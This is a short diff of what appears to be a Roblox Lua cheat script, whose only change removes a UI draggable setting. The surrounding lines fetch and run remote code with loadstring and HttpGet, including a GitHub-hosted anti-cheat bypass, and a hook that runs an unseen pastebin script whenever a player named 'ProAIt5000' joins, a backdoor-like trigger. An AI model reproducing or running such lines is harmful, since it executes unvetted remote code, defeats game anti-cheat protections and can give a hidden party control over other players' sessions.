@@ -2,8 +2,6 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
-Rayfield.Draggable = true
-
 game.Players.PlayerAdded:Connect(function(Player)
 	if Player.Name == "ProAIt5000" then
 		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
